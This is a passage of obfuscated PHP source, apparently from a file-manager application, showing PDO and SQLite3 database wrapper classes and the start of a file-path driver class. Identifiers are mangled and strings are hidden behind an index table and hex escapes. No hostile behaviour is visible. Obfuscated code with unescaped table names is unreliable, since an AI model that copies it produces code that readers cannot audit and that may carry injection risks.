$§¤‡®Šº =& $_SERVER[ü¢ÙÊñÛ]; if (!class_exists($§¤‡®Šº[980])) { think_exception(think_lang($§¤‡®Šº[24]) . $§¤‡®Šº[981]); } if (!empty($˜«³êı€)) { $this->config = $˜«³êı€; if (empty($this->config[$§¤‡®Šº[27]])) { $this->config[$§¤‡®Šº[27]] = array(); } } } public function connect($•Í®‹»Ó = '', $ÚÉÊæƒ´ = 0) { $Ï÷øı×³ =& $_SERVER[ü¢ÙÊñÛ]; if (!isset($this->linkID[$ÚÉÊæƒ´])) { if (empty($•Í®‹»Ó)) { $•Í®‹»Ó = $this->config; } $‡„›«“ë = !empty($•Í®‹»Ó[$Ï÷øı×³[27]][$Ï÷øı×³[28]]) ? $•Í®‹»Ó[$Ï÷øı×³[27]][$Ï÷øı×³[28]] : $this->pconnect; if ($‡„›«“ë) { $•Í®‹»Ó[$Ï÷øı×³[27]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$ÚÉÊæƒ´] = new PDO($•Í®‹»Ó[$Ï÷øı×³[982]], $•Í®‹»Ó[$Ï÷øı×³[954]], $•Í®‹»Ó[$Ï÷øı×³[955]], $•Í®‹»Ó[$Ï÷øı×³[27]]); } catch (PDOException $èæº¢Ï) { think_exception($èæº¢Ï->getMessage()); } $this->dbType = $this->_getDsnType($•Í®‹»Ó[$Ï÷øı×³[982]]); if (in_array($this->dbType, array($Ï÷øı×³[983], $Ï÷øı×³[984], $Ï÷øı×³[985], $Ï÷øı×³[986]))) { think_exception($Ï÷øı×³[987] . $this->dbType . $Ï÷øı×³[988] . $this->dbType . $Ï÷øı×³[989]); } if (!$this->linkID[$ÚÉÊæƒ´]) { think_exception($Ï÷øı×³[990]); } try { $this->linkID[$ÚÉÊæƒ´]->exec($Ï÷øı×³[991] . think_config($Ï÷øı×³[957])); } catch (Exception $èæº¢Ï) { } $this->connected = !0; if (1 != think_config($Ï÷øı×³[32])) { unset($this->config); } } return $this->linkID[$ÚÉÊæƒ´]; } public function free() { $this->PDOStatement = null; } public function query($ş¦ë¬ò, $î¢’Åı“ = array()) { $û“¢ÌŞ¼ =& $_SERVER[ü¢ÙÊñÛ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ş¦ë¬ò; if (!empty($î¢’Åı“)) { $this->queryStr .= $û“¢ÌŞ¼[992] . print_r($î¢’Åı“, !0) . $û“¢ÌŞ¼[993]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($û“¢ÌŞ¼[33], 1); think_status($û“¢ÌŞ¼[34]); $this->PDOStatement = $this->_linkID->prepare($ş¦ë¬ò); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $æœÊò›† = $this->PDOStatement->execute($î¢’Åı“); $this->debug(); if (!1 === $æœÊò›†) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ÖŒ’¥Òš, $äĞ¾®Ïâ = array()) { $É«£Š÷œ =& $_SERVER[ü¢ÙÊñÛ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÖŒ’¥Òš; if (!empty($äĞ¾®Ïâ)) { $this->queryStr .= $É«£Š÷œ[992] . print_r($äĞ¾®Ïâ, !0) . $É«£Š÷œ[993]; } $¶§ÌÖòú = !1; if ($this->dbType == $É«£Š÷œ[986]) { if (preg_match($É«£Š÷œ[994], $this->queryStr, $Á‡Œ•Ö¿)) { $this->table = think_config($É«£Š÷œ[995]) . str_ireplace(think_config($É«£Š÷œ[996]), $É«£Š÷œ[64], $Á‡Œ•Ö¿[2]); $¶§ÌÖòú = (bool) $this->query($É«£Š÷œ[997] . strtoupper($this->table) . $É«£Š÷œ[69]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($É«£Š÷œ[35], 1); think_status($É«£Š÷œ[34]); $this->PDOStatement = $this->_linkID->prepare($ÖŒ’¥Òš); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $‚âüúİ´ = $this->PDOStatement->execute($äĞ¾®Ïâ); $this->debug(); if (!1 === $‚âüúİ´) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($¶§ÌÖòú || preg_match($É«£Š÷œ[998], $ÖŒ’¥Òš)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $£«½äŸ = $this->_linkID->commit(); $this->transTimes = 0; if (!$£«½äŸ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¯ˆïÃ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$¯ˆïÃ) { $this->error(); return !1; } } return !0; } private function getAll() { $ªÕõâÙ† = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ªÕõâÙ†); return $ªÕõâÙ†; } public function getFields($œšü€à­) { $€°íöö§ =& $_SERVER[ü¢ÙÊñÛ]; $this->initConnect(!0); if (think_config($€°íöö§[999])) { $ë¡©­Ùç = str_replace($€°íöö§[1000], $œšü€à­, think_config($€°íöö§[999])); } else { switch ($this->dbType) { case $€°íöö§[983]: case $€°íöö§[1001]: $ë¡©­Ùç = "\x53\105\x4c\105\x43\x54\40\40\x20\143\157\x6c\x75\x6d\156\137\x6e\141\x6d\145\40\141\163\x20\x27\x4e\x61\155\x65\47\54\40\x20\40\x64\141\x74\x61\x5f\x74\x79\x70\145\40\141\163\x20\47\x54\x79\160\x65\x27\54\40\40\x20\x63\x6f\x6c\165\x6d\156\137\144\x65\x66\141\165\x6c\x74\40\141\163\x20\x27\104\145\146\141\165\154\x74\x27\54\40\x20\x20\x69\x73\x5f\156\165\x6c\154\x61\142\x6c\145\40\141\x73\x20\47\x4e\x75\154\x6c\47\12\11\x9\x46\122\x4f\115\11\151\156\x66\157\162\x6d\x61\x74\x69\157\156\137\163\x63\150\x65\x6d\141\56\x74\x61\142\154\x65\163\x20\101\x53\x20\164\xa\x9\x9\112\x4f\111\116\x9\151\156\146\157\x72\x6d\x61\x74\x69\157\x6e\x5f\x73\143\x68\x65\155\141\56\143\x6f\x6c\165\x6d\x6e\163\40\x41\x53\40\143\12\x9\11\x4f\x4e\40\40\164\x2e\x74\141\x62\154\x65\137\x63\x61\164\141\x6c\x6f\x67\40\x3d\x20\143\x2e\x74\141\x62\x6c\145\x5f\x63\141\x74\141\x6c\157\x67\12\11\x9\x41\x4e\x44\40\164\x2e\x74\141\x62\154\x65\x5f\163\x63\150\x65\x6d\141\40\x3d\x20\143\56\164\141\142\154\145\x5f\x73\143\150\x65\155\x61\12\x9\x9\x41\116\104\40\x74\x2e\164\x61\x62\x6c\145\137\x6e\x61\x6d\x65\40\x3d\40\x63\x2e\x74\x61\142\x6c\x65\x5f\x6e\x61\155\145\xa\x9\x9\127\x48\x45\122\x45\x20\x20\x20\164\56\x74\141\142\154\x65\137\x6e\x61\155\x65\x20\75\x20\x27{$œšü€à­}\47"; break; case $€°íöö§[1002]: $ë¡©­Ùç = $€°íöö§[1003] . $œšü€à­ . $€°íöö§[1004]; break; case $€°íöö§[984]: case $€°íöö§[986]: $ë¡©­Ùç = $€°íöö§[1005] . $€°íöö§[1006] . $€°íöö§[1007] . strtoupper($œšü€à­) . $€°íöö§[1008] . strtoupper($œšü€à­) . $€°íöö§[1009]; break; case $€°íöö§[1010]: $ë¡©­Ùç = $€°íöö§[1011] . $œšü€à­ . $€°íöö§[1012]; break; case $€°íöö§[985]: break; case $€°íöö§[1013]: default: $ë¡©­Ùç = $€°íöö§[1014] . ($this->dbType == $€°íöö§[1013] ? "\140{$œšü€à­}\140" : $œšü€à­); } } $²æ¯ù»© = $this->query($ë¡©­Ùç); $½ ¡´úÁ = array(); if ($²æ¯ù»©) { foreach ($²æ¯ù»© as $Ûº‡ÄÎ¤ => $Û¶ë·´Á) { $Û¶ë·´Á = array_change_key_case($Û¶ë·´Á); $Û¶ë·´Á[$€°íöö§[42]] = isset($Û¶ë·´Á[$€°íöö§[42]]) ? $Û¶ë·´Á[$€°íöö§[42]] : $€°íöö§[64]; $Û¶ë·´Á[$€°íöö§[43]] = isset($Û¶ë·´Á[$€°íöö§[43]]) ? $Û¶ë·´Á[$€°íöö§[43]] : $€°íöö§[64]; $º‰¡×ÀÂ = isset($Û¶ë·´Á[$€°íöö§[362]]) ? $Û¶ë·´Á[$€°íöö§[362]] : $Û¶ë·´Á[$€°íöö§[42]]; $½ ¡´úÁ[$º‰¡×ÀÂ] = array($€°íöö§[42] => $º‰¡×ÀÂ, $€°íöö§[43] => $Û¶ë·´Á[$€°íöö§[43]], $€°íöö§[45] => (bool) (isset($Û¶ë·´Á[$€°íöö§[117]]) && $Û¶ë·´Á[$€°íöö§[117]] === $€°íöö§[22] || isset($Û¶ë·´Á[$€°íöö§[45]]) && $Û¶ë·´Á[$€°íöö§[45]] === $€°íöö§[22]), $€°íöö§[47] => isset($Û¶ë·´Á[$€°íöö§[47]]) ? $Û¶ë·´Á[$€°íöö§[47]] : (isset($Û¶ë·´Á[$€°íöö§[67]]) ? $Û¶ë·´Á[$€°íöö§[67]] : $€°íöö§[64]), $€°íöö§[49] => isset($Û¶ë·´Á[$€°íöö§[108]]) ? strtolower($Û¶ë·´Á[$€°íöö§[108]]) == $€°íöö§[51] : (isset($Û¶ë·´Á[$€°íöö§[68]]) ? $Û¶ë·´Á[$€°íöö§[68]] : !1), $€°íöö§[52] => isset($Û¶ë·´Á[$€°íöö§[1015]]) ? strtolower($Û¶ë·´Á[$€°íöö§[1015]]) == $€°íöö§[54] : (isset($Û¶ë·´Á[$€°íöö§[108]]) ? $Û¶ë·´Á[$€°íöö§[108]] : !1)); } } return $½ ¡´úÁ; } public function getTables($¿ã÷Õ²¤ = '') { $ÖÄ•‰½¼ =& $_SERVER[ü¢ÙÊñÛ]; if (think_config($ÖÄ•‰½¼[1016])) { $¡“‰Ê = str_replace($ÖÄ•‰½¼[1017], $¿ã÷Õ²¤, think_config($ÖÄ•‰½¼[1016])); } else { switch ($this->dbType) { case $ÖÄ•‰½¼[984]: case $ÖÄ•‰½¼[986]: $¡“‰Ê = $ÖÄ•‰½¼[1018]; break; case $ÖÄ•‰½¼[983]: case $ÖÄ•‰½¼[1001]: $¡“‰Ê = $ÖÄ•‰½¼[1019]; break; case $ÖÄ•‰½¼[1010]: $¡“‰Ê = $ÖÄ•‰½¼[1020]; break; case $ÖÄ•‰½¼[985]: think_exception(think_lang($ÖÄ•‰½¼[1021]) . $ÖÄ•‰½¼[1022]); break; case $ÖÄ•‰½¼[1002]: $¡“‰Ê = $ÖÄ•‰½¼[55] . $ÖÄ•‰½¼[56] . $ÖÄ•‰½¼[57]; break; case $ÖÄ•‰½¼[1013]: default: if (!empty($¿ã÷Õ²¤)) { $¡“‰Ê = $ÖÄ•‰½¼[965] . $¿ã÷Õ²¤ . $ÖÄ•‰½¼[966]; } else { $¡“‰Ê = $ÖÄ•‰½¼[967]; } } } $òò¶Ş’ = $this->query($¡“‰Ê); $ª¥ú ‹ = array(); foreach ($òò¶Ş’ as $á±·õõ™ => $”ÙÌ›ŠÃ) { $ª¥ú ‹[$á±·õõ™] = current($”ÙÌ›ŠÃ); } return $ª¥ú ‹; } protected function parseLimit($²ôœ¸¶ñ) { $ÊíİÂáè =& $_SERVER[ü¢ÙÊñÛ]; $òÑôîİÏ = $ÊíİÂáè[22]; if (!empty($²ôœ¸¶ñ)) { switch ($this->dbType) { case $ÊíİÂáè[1010]: case $ÊíİÂáè[1002]: $²ôœ¸¶ñ = explode($ÊíİÂáè[60], $²ôœ¸¶ñ); if (count($²ôœ¸¶ñ) > 1) { $òÑôîİÏ .= $ÊíİÂáè[61] . $²ôœ¸¶ñ[1] . $ÊíİÂáè[62] . $²ôœ¸¶ñ[0] . $ÊíİÂáè[63]; } else { $òÑôîİÏ .= $ÊíİÂáè[61] . $²ôœ¸¶ñ[0] . $ÊíİÂáè[63]; } break; case $ÊíİÂáè[983]: case $ÊíİÂáè[1001]: break; case $ÊíİÂáè[985]: break; case $ÊíİÂáè[984]: case $ÊíİÂáè[986]: break; case $ÊíİÂáè[1013]: default: $òÑôîİÏ .= $ÊíİÂáè[61] . $²ôœ¸¶ñ . $ÊíİÂáè[63]; } } return $òÑôîİÏ; } public function parseKey(&$¬ßúù›Æ, $ĞñÔ«ğÛ = true) { $ıÔ³ŠÕ =& $_SERVER[ü¢ÙÊñÛ]; if ($ĞñÔ«ğÛ) { $¬ßúù›Æ = $this->parseKeyCheck($¬ßúù›Æ); } if ($this->dbType == $ıÔ³ŠÕ[1013]) { if ($¬ßúù›Æ != $ıÔ³ŠÕ[233] && !preg_match($ıÔ³ŠÕ[977], $¬ßúù›Æ)) { $¬ßúù›Æ = $ıÔ³ŠÕ[472] . trim($¬ßúù›Æ, $ıÔ³ŠÕ[472]) . $ıÔ³ŠÕ[472]; } return $¬ßúù›Æ; } else { return parent::parseKey($¬ßúù›Æ, $ĞñÔ«ğÛ); } } public function close() { $this->_linkID = null; } public function error() { $èè€˜ßİ =& $_SERVER[ü¢ÙÊñÛ]; if ($this->PDOStatement) { $ıÔóÆ£ó = $this->PDOStatement->errorInfo(); $this->error = $ıÔóÆ£ó[1] . $èè€˜ßİ[14] . $ıÔóÆ£ó[2]; } else { $this->error = $èè€˜ßİ[22]; } if ($èè€˜ßİ[22] != $this->queryStr) { $this->error .= LNG($èè€˜ßİ[58]) . $this->queryStr; } think_trace($this->error, $èè€˜ßİ[22], $èè€˜ßİ[59]); return $this->error; } public function escapeString($€óôß’Õ) { $şÀŞß®‘ =& $_SERVER[ü¢ÙÊñÛ]; switch ($this->dbType) { case $şÀŞß®‘[1010]: case $şÀŞß®‘[983]: case $şÀŞß®‘[1001]: case $şÀŞß®‘[1013]: return addslashes($€óôß’Õ); case $şÀŞß®‘[985]: case $şÀŞß®‘[1002]: case $şÀŞß®‘[984]: case $şÀŞß®‘[986]: return str_ireplace($şÀŞß®‘[69], $şÀŞß®‘[70], $€óôß’Õ); } } protected function parseValue($ÜÆ®¥ËÙ) { $ÆêôÁîÒ =& $_SERVER[ü¢ÙÊñÛ]; if (is_string($ÜÆ®¥ËÙ)) { $·ÊÈÕ†‰ = strpos($ÜÆ®¥ËÙ, $ÆêôÁîÒ[14]) === 0 && in_array($ÜÆ®¥ËÙ, array_keys($this->bind)); $ÜÆ®¥ËÙ = $·ÊÈÕ†‰ ? $this->escapeString($ÜÆ®¥ËÙ) : $ÆêôÁîÒ[1023] . $this->escapeString($ÜÆ®¥ËÙ) . $ÆêôÁîÒ[1023]; } elseif (isset($ÜÆ®¥ËÙ[0]) && is_string($ÜÆ®¥ËÙ[0]) && strtolower($ÜÆ®¥ËÙ[0]) == $ÆêôÁîÒ[384]) { $ÜÆ®¥ËÙ = $this->escapeString($ÜÆ®¥ËÙ[1]); } elseif (is_array($ÜÆ®¥ËÙ)) { $ÜÆ®¥ËÙ = array_map(array($this, $ÆêôÁîÒ[1024]), $ÜÆ®¥ËÙ); } elseif (is_bool($ÜÆ®¥ËÙ)) { $ÜÆ®¥ËÙ = $ÜÆ®¥ËÙ ? $ÆêôÁîÒ[102] : $ÆêôÁîÒ[241]; } elseif (is_null($ÜÆ®¥ËÙ)) { $ÜÆ®¥ËÙ = $ÆêôÁîÒ[117]; } return $ÜÆ®¥ËÙ; } public function getLastInsertId() { $¹Şü–Ñä =& $_SERVER[ü¢ÙÊñÛ]; switch ($this->dbType) { case $¹Şü–Ñä[1010]: case $¹Şü–Ñä[1002]: case $¹Şü–Ñä[983]: case $¹Şü–Ñä[1001]: case $¹Şü–Ñä[985]: case $¹Şü–Ñä[1013]: return $this->_linkID->lastInsertId(); case $¹Şü–Ñä[984]: case $¹Şü–Ñä[986]: $€ÄİÊåº = $this->table; $¹Ş¬‰¶ = $this->query("\x53\105\114\x45\103\x54\x20{$€ÄİÊåº}\x2e\143\x75\x72\x72\x76\x61\x6c\x20\x63\x75\x72\x72\x76\x61\154\x20\x46\x52\117\115\x20\x64\165\141\154"); return $¹Ş¬‰¶ ? $¹Ş¬‰¶[0][$¹Şü–Ñä[1025]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($Æ†µ»§š) { $†›şºŞ =& $_SERVER[ü¢ÙÊñÛ]; if (!CacheLock::fileLock($†›şºŞ[23])) { return !1; } $ì³¨ô—´ = parent::query($Æ†µ»§š); CacheLock::fileUnLock($†›şºŞ[23]); return $ì³¨ô—´; } public function execute($íˆİÂÂÃ) { $èÒ……Ó× =& $_SERVER[ü¢ÙÊñÛ]; if (!CacheLock::fileLock($èÒ……Ó×[23])) { return !1; } $ë½–Ë = parent::execute($íˆİÂÂÃ); CacheLock::fileUnLock($èÒ……Ó×[23]); return $ë½–Ë; } } class DbSqlite3 extends DbSqlite3Base { public function query($ôª“û¤›) { $‡çß®ƒ¼ =& $_SERVER[ü¢ÙÊñÛ]; if (!CacheLock::fileLock($‡çß®ƒ¼[23])) { return !1; } $³—ù£“ = parent::query($ôª“û¤›); CacheLock::fileUnLock($‡çß®ƒ¼[23]); return $³—ù£“; } public function execute($‹¶³Áë¨) { $À†Ä¢× =& $_SERVER[ü¢ÙÊñÛ]; if (!CacheLock::fileLock($À†Ä¢×[23])) { return !1; } $Ü­—« = parent::execute($‹¶³Áë¨); CacheLock::fileUnLock($À†Ä¢×[23]); return $Ü­—«; } } goto Câ„·„Œ¬©; E»½„±•›ë: class DbSqlite3Base extends Db { public function __construct($ÎØ³ÉËÚ = '') { $ÉÂˆÊìÆ =& $_SERVER[ü¢ÙÊñÛ]; if (!class_exists($ÉÂˆÊìÆ[65])) { think_exception(think_lang($ÉÂˆÊìÆ[24]) . $ÉÂˆÊìÆ[66]); } if (!empty($ÎØ³ÉËÚ)) { if (!isset($ÎØ³ÉËÚ[$ÉÂˆÊìÆ[26]])) { $ÎØ³ÉËÚ[$ÉÂˆÊìÆ[26]] = 438; } $this->config = $ÎØ³ÉËÚ; if (empty($this->config[$ÉÂˆÊìÆ[27]])) { $this->config[$ÉÂˆÊìÆ[27]] = array(); } } } public function connect($ËıüÇğå = '', $Ù¦ãÄ…¡ = 0) { $†ì¾ïñä =& $_SERVER[ü¢ÙÊñÛ]; if (!isset($this->linkID[$Ù¦ãÄ…¡])) { if (empty($ËıüÇğå)) { $ËıüÇğå = $this->config; } $this->linkID[$Ù¦ãÄ…¡] = new SQLite3($ËıüÇğå[$†ì¾ïñä[31]]); if (!$this->linkID[$Ù¦ãÄ…¡]) { think_exception($this->linkID[$Ù¦ãÄ…¡]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$Ù¦ãÄ…¡]->busyTimeout(30000); if (1 != think_config($†ì¾ïñä[32])) { unset($this->config); } } return $this->linkID[$Ù¦ãÄ…¡]; } public function free() { $this->queryID = null; } public function query($š‘ÎÈÛ) { $á”¸Èƒ =& $_SERVER[ü¢ÙÊñÛ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $š‘ÎÈÛ; if ($this->queryID) { $this->free(); } think_action_status($á”¸Èƒ[33], 1); think_status($á”¸Èƒ[34]); $this->queryID = $this->_linkID->query($š‘ÎÈÛ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $Šäü§ Ã = $this->getAll(); $this->numRows = count($Šäü§ Ã); return $Šäü§ Ã; } } public function execute($İ®…¹éî) { $”ğÈêë =& $_SERVER[ü¢ÙÊñÛ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $İ®…¹éî; if ($this->queryID) { $this->free(); } think_action_status($”ğÈêë[35], 1); think_status($”ğÈêë[34]); $ıóëÍ– = $this->_linkID->exec($İ®…¹éî); $this->debug(); if (!1 === $ıóëÍ–) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ü¢ÙÊñÛ][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ĞÁ™‡¾„ = $this->_linkID->query($_SERVER[ü¢ÙÊñÛ][37]); if (!$ĞÁ™‡¾„) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Åİ•€ÛË = $this->_linkID->query($_SERVER[ü¢ÙÊñÛ][38]); if (!$Åİ•€ÛË) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $«É¥úº = array(); while ($Ö¶¼¿Áº = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $«É¥úº[] = $Ö¶¼¿Áº; } $this->queryID->reset(); return $«É¥úº; } public function getFields($è°¼ãµè) { $Å¥Üìİü =& $_SERVER[ü¢ÙÊñÛ]; $ÄÙÆÓ‡É = $this->query($Å¥Üìİü[39] . $è°¼ãµè . $Å¥Üìİü[40]); $áôÄ˜ï‘ = array(); if ($ÄÙÆÓ‡É) { foreach ($ÄÙÆÓ‡É as $‡…Ùã¬ => $òó–æ) { $áôÄ˜ï‘[$òó–æ[$Å¥Üìİü[42]]] = array($Å¥Üìİü[42] => $òó–æ[$Å¥Üìİü[42]], $Å¥Üìİü[43] => $òó–æ[$Å¥Üìİü[43]], $Å¥Üìİü[45] => (bool) ($òó–æ[$Å¥Üìİü[45]] === $Å¥Üìİü[22]), $Å¥Üìİü[47] => $òó–æ[$Å¥Üìİü[67]], $Å¥Üìİü[49] => (bool) $òó–æ[$Å¥Üìİü[68]], $Å¥Üìİü[52] => (bool) $òó–æ[$Å¥Üìİü[68]]); } } return $áôÄ˜ï‘; } public function getTables($„Ô»½³± = '') { $îœ•¬½ =& $_SERVER[ü¢ÙÊñÛ]; $•ğÂÓåè = $this->query($îœ•¬½[55] . $îœ•¬½[56] . $îœ•¬½[57]); $’È¦‡Æå = array(); foreach ($•ğÂÓåè as $Àë«©– => $…áäÕ¦) { $’È¦‡Æå[$Àë«©–] = current($…áäÕ¦); } return $’È¦‡Æå; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $”¦æÒÎ¶ =& $_SERVER[ü¢ÙÊñÛ]; $this->error = $this->_linkID->lastErrorMsg(); if ($”¦æÒÎ¶[22] != $this->queryStr) { $this->error .= LNG($”¦æÒÎ¶[58]) . $this->queryStr; } think_trace($this->error, $”¦æÒÎ¶[22], $”¦æÒÎ¶[59]); return $this->error; } public function escapeString($ ªªùŸÔ) { $ÃıØÈ”É =& $_SERVER[ü¢ÙÊñÛ]; if ($this->_linkID) { return $this->_linkID->escapeString($ ªªùŸÔ); } return str_ireplace($ÃıØÈ”É[69], $ÃıØÈ”É[70], $ ªªùŸÔ); } public function parseLimit($æóÕŸ‰) { $£ĞÍ™Ô½ =& $_SERVER[ü¢ÙÊñÛ]; $ßé¾™’ò = $£ĞÍ™Ô½[22]; if (!empty($æóÕŸ‰)) { $æóÕŸ‰ = explode($£ĞÍ™Ô½[60], $æóÕŸ‰); if (count($æóÕŸ‰) > 1) { $ßé¾™’ò .= $£ĞÍ™Ô½[61] . $æóÕŸ‰[1] . $£ĞÍ™Ô½[62] . $æóÕŸ‰[0] . $£ĞÍ™Ô½[63]; } else { $ßé¾™’ò .= $£ĞÍ™Ô½[61] . $æóÕŸ‰[0] . $£ĞÍ™Ô½[63]; } } return $ßé¾™’ò; } } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $±üâşïŠ =& $_SERVER[ü¢ÙÊñÛ]; $this->objectDriver = array($±üâşïŠ[71], $±üâşïŠ[72], $±üâşïŠ[73], $±üâşïŠ[74], $±üâşïŠ[75], $±üâşïŠ[76], $±üâşïŠ[77], $±üâşïŠ[78], $±üâşïŠ[79], $±üâşïŠ[80], $±üâşïŠ[81], $±üâşïŠ[82]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($»ŠÃ­™) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($»ŠÃ­™, $_SERVER[ü¢ÙÊñÛ][18]); } return $»ŠÃ­™; } public function iconvApp($û¯ã÷ë¨) { return $û¯ã÷ë¨; } public function iconvSystem($¶Ì³†°ç) { return $¶Ì³†°ç; } public function iconvTo($ã˜ÏÆ‚¨, $ò©¬©„¯, $”µÑÅÄŠ) { $‘ºµñâã =& $_SERVER[ü¢ÙÊñÛ]; if (!$ã˜ÏÆ‚¨ || !function_exists($‘ºµñâã[83])) { return $ã˜ÏÆ‚¨; } static $£µî¡àµ = array(); $Ïºôùá¹ = $ò©¬©„¯ . $‘ºµñâã[84] . $”µÑÅÄŠ . $‘ºµñâã[85] . $ã˜ÏÆ‚¨; if (isset($£µî¡àµ[$Ïºôùá¹])) { return $£µî¡àµ[$Ïºôùá¹]; } if (function_exists($‘ºµñâã[86])) { $²äÚÀÂÅ = @mb_convert_encoding($ã˜ÏÆ‚¨, $”µÑÅÄŠ, $ò©¬©„¯); } else { $²äÚÀÂÅ = @iconv($ò©¬©„¯, $”µÑÅÄŠ, $ã˜ÏÆ‚¨); } $²äÚÀÂÅ = $²äÚÀÂÅ ? $²äÚÀÂÅ : $ã˜ÏÆ‚¨; if (strstr($²äÚÀÂÅ, $‘ºµñâã[87])) { $²äÚÀÂÅ = str_replace($‘ºµñâã[87], $‘ºµñâã[21], $²äÚÀÂÅ); } $£µî¡àµ[$ò©¬©„¯ . $‘ºµñâã[84] . $”µÑÅÄŠ . $‘ºµñâã[85] . $ã˜ÏÆ‚¨] = $²äÚÀÂÅ; $£µî¡àµ[$”µÑÅÄŠ . $‘ºµñâã[84] . $ò©¬©„¯ . $‘ºµñâã[85] . $ã˜ÏÆ‚¨] = $ã˜ÏÆ‚¨; $£µî¡àµ[$”µÑÅÄŠ . $‘ºµñâã[84] . $ò©¬©„¯ . $‘ºµñâã[85] . $²äÚÀÂÅ] = $ã˜ÏÆ‚¨; $£µî¡àµ[$ò©¬©„¯ . $‘ºµñâã[84] . $”µÑÅÄŠ . $‘ºµñâã[85] . $²äÚÀÂÅ] = $²äÚÀÂÅ; return $²äÚÀÂÅ; } public function getPathInner($†§²»Ñö) { $‡”áĞ°É = IO::init($†§²»Ñö); return $‡”áĞ°É->path; } public function getPathOuter($àï–¨ã) { $«·—¯Õ =& $_SERVER[ü¢ÙÊñÛ]; $ôç¶¥¯¶ = strlen(trim($this->pathBase, $«·—¯Õ[18])); $àï–¨ã = substr(trim($àï–¨ã, $«·—¯Õ[18]), $ôç¶¥¯¶); return $this->pathDriver . $«·—¯Õ[18] . ltrim($àï–¨ã, $«·—¯Õ[18]); } public function isParentOf($…¢Îá™™, $ï†ª×¼Ù) { $˜Ó æÖ… =& $_SERVER[ü¢ÙÊñÛ]; $…¢Îá™™ = rtrim(strtolower($…¢Îá™™), $˜Ó æÖ…[18]) . $˜Ó æÖ…[18]; $ï†ª×¼Ù = rtrim(strtolower($ï†ª×¼Ù), $˜Ó æÖ…[18]) . $˜Ó æÖ…[18]; $ºå×è´È = strpos($ï†ª×¼Ù, $…¢Îá™™) === 0; return $ºå×è´È; } public function getType() { $ÑŞ¸·¦§ =& $_SERVER[ü¢ÙÊñÛ]; $ÈÈªÕ€“ = str_replace($ÑŞ¸·¦§[88], $ÑŞ¸·¦§[22], get_class($this)); return strtolower($ÈÈªÕ€“); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Õ÷ö¡ñ€, $•œ¾é) { $‘âäæ¤ =& $_SERVER[ü¢ÙÊñÛ]; $ª‹ÇÎËŠ = rtrim($Õ÷ö¡ñ€, $‘âäæ¤[18]) . $‘âäæ¤[18] . $•œ¾é; $µÎŞ«ù³ = $this->exist($ª‹ÇÎËŠ); return $µÎŞ«ù³ ? $ª‹ÇÎËŠ : !1; } public function setModifyTime($¸ùÒÙØİ, $Ô‚ö“Êâ = '') { } public function renameObject($ºÅà…£•, $¬¼òÒé) { $ëíÃ´ìä = $¬¼òÒé; $ºÅà…£• = $this->getPathOuter($ºÅà…£•); $¬¼òÒé = $this->pathFather($ºÅà…£•) . $¬¼òÒé; $ÏÖ€³Ê = IO::copy($ºÅà…£•, $this->pathFather($ºÅà…£•), REPEAT_RENAME_FOLDER, $ëíÃ´ìä); if ($ÏÖ€³Ê) { IO::remove($ºÅà…£•); } return $ÏÖ€³Ê ? $¬¼òÒé : !1; } public function tempFile($¯™á° = '', $Ç«¯õäñ = '') { if (!$¯™á°) { $¯™á° = rand_string(15); } $ìğˆ˜ßá = TEMP_FILES . rand_string(15) . $_SERVER[ü¢ÙÊñÛ][18]; @mkdir($ìğˆ˜ßá, DEFAULT_PERRMISSIONS, !0); $Ä¸¯ùˆ = $ìğˆ˜ßá . $¯™á°; @touch($Ä¸¯ùˆ); if ($Ç«¯õäñ) { file_put_contents($Ä¸¯ùˆ, $Ç«¯õäñ); } return $Ä¸¯ùˆ; } public function tempFileRemve($ËÓãÏÙÇ) { @unlink($ËÓãÏÙÇ); @rmdir($this->pathFather($ËÓãÏÙÇ)); } public function mkfile($õ˜Œ…ñã, $ĞÛş¤åÇ = '', $ÔßÖ×ùç = REPEAT_RENAME) { } public function mkdir($á•ŠËğä, $†¦êæş• = REPEAT_SKIP) { } public function delFile($õ¯ÙŠËÛ) { } public function delFolder($—ö‘¨ˆÈ) { } public function copyFile($ó´µŸê˜, $¾¾Â™›¦) { } public function moveFile($º¡ÅÈ¢É, $ôœÒ‡) { } public function remove($¾›Àßß€) { if ($this->isFile($¾›Àßß€)) { return $this->delFile($¾›Àßß€); } return $this->delFolder($¾›Àßß€); } public function rename($Åñ‰Ú…, 